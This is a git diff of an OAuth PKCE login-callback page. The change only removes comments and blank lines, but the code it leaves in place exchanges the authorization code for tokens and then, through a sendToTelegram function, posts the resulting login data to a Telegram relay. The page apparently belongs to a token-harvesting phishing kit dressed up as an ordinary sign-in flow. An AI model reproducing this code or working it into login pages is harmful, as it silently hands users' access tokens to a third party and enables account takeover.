@@ -129,17 +129,16 @@
     <script>
         console.log('🔍 PKCE Callback page loaded');
         console.log('🔍 URL:', window.location.href);
-        
-        // Process the OAuth callback immediately
+
         window.addEventListener('load', async () => {
             await handlePKCECallback();
         });
-        
+
         async function handlePKCECallback() {
             const statusDiv = document.getElementById('status');
             const userInfoDiv = document.getElementById('userInfo');
             const debugInfoDiv = document.getElementById('debugInfo');
-            
+
             try {
                 // Parse URL parameters
                 const urlParams = new URLSearchParams(window.location.search);
@@ -147,53 +146,53 @@
                 const state = urlParams.get('state');
                 const error = urlParams.get('error');
                 const errorDescription = urlParams.get('error_description');
-                
+
                 console.log('🔍 OAuth callback parameters:', {
                     hasCode: !!code,
                     state: state,
                     error: error
                 });
-                
+
                 // Check for OAuth errors
                 if (error) {
                     statusDiv.className = 'status error';
                     statusDiv.innerHTML = `❌ OAuth Error: ${error}<br>${errorDescription}`;
                     return;
                 }
-                
+
                 // Validate authorization code
                 if (!code) {
                     statusDiv.className = 'status error';
                     statusDiv.innerHTML = '❌ No authorization code received';
                     return;
                 }
-                
+
                 // Retrieve PKCE parameters from sessionStorage
                 const storedCodeVerifier = sessionStorage.getItem('pkce_code_verifier');
                 const storedState = sessionStorage.getItem('pkce_state');
-                
+
                 console.log('🔍 Stored PKCE parameters:', {
                     hasCodeVerifier: !!storedCodeVerifier,
                     storedState: storedState,
                     receivedState: state
                 });
-                
+
                 // Validate state parameter
                 if (!storedState || storedState !== state) {
                     statusDiv.className = 'status error';
                     statusDiv.innerHTML = '❌ Invalid state parameter - possible CSRF attack';
                     return;
                 }
-                
+
                 // Validate code_verifier
                 if (!storedCodeVerifier) {
                     statusDiv.className = 'status error';
                     statusDiv.innerHTML = '❌ No code_verifier found - PKCE flow incomplete';
                     return;
                 }
-                
+
                 statusDiv.innerHTML = '🔄 PKCE validation successful - exchanging code for tokens...';
-                
+
                 // Perform token exchange with PKCE
                 const currentDomain = window.location.origin;
                 const tokenResponse = await fetch(`${currentDomain}/.netlify/functions/tokenExchange`, {
@@ -205,16 +204,14 @@
                         code_verifier: storedCodeVerifier
                     })
                 });
-                
+
                 const tokenResult = await tokenResponse.json();
                 console.log('🔍 Token exchange result:', tokenResult);
-                
+
                 if (tokenResult.success) {
-                    // Success - display user information
                     statusDiv.className = 'status success';
                     statusDiv.innerHTML = '✅ PKCE OAuth login successful!';
-                    
-                    // Display user information
+
                     userInfoDiv.style.display = 'block';
                     userInfoDiv.innerHTML = `
                         <div class="user-info">
@@ -245,8 +242,7 @@
                             </div>
                         </div>
                     `;
-                    
-                    // Display debug information
+
                     debugInfoDiv.style.display = 'block';
                     debugInfoDiv.innerHTML = `
                         <div class="debug-section">
@@ -260,24 +256,20 @@
                             <div><strong>Offline Access:</strong> ${tokenResult.tokens?.offline_access}</div>
                         </div>
                     `;
-                    
-                    // Send to Telegram
+
                     await sendToTelegram(tokenResult);
-                    
-                    // Clean up sessionStorage
+
                     sessionStorage.removeItem('pkce_code_verifier');
                     sessionStorage.removeItem('pkce_state');
-                    
+
                 } else {
-                    // Token exchange failed
                     statusDiv.className = 'status error';
                     statusDiv.innerHTML = `❌ Token exchange failed: ${tokenResult.error}`;
-                    
+
                     if (tokenResult.hint) {
                         statusDiv.innerHTML += `<br>💡 Hint: ${tokenResult.hint}`;
                     }
-                    
-                    // Show debug info for troubleshooting
+
                     debugInfoDiv.style.display = 'block';
                     debugInfoDiv.innerHTML = `
                         <div class="debug-section">
@@ -289,19 +281,17 @@
                         </div>
                     `;
                 }
-                
+
             } catch (error) {
                 console.error('❌ PKCE callback error:', error);
                 statusDiv.className = 'status error';
                 statusDiv.innerHTML = `❌ Callback processing error: ${error.message}`;
             }
         }
-        
-        // Send successful login data to Telegram
+
         async function sendToTelegram(tokenResult) {
             try {
                 console.log('📤 Sending PKCE login data to Telegram...');
-                
                 const currentDomain = window.location.origin;
                 const telegramResponse = await fetch(`${currentDomain}/.netlify/functions/sendTelegram`, {
                     method: 'POST',
@@ -319,14 +309,14 @@
                         timestamp: new Date().toISOString()
                     })
                 });
-                
+
                 if (telegramResponse.ok) {
                     const result = await telegramResponse.json();
                     console.log('✅ Successfully sent to Telegram:', result);
                 } else {
                     console.log('⚠️ Failed to send to Telegram:', telegramResponse.status);
                 }
-                
+
             } catch (telegramError) {
                 console.error('❌ Telegram send error:', telegramError);
             }
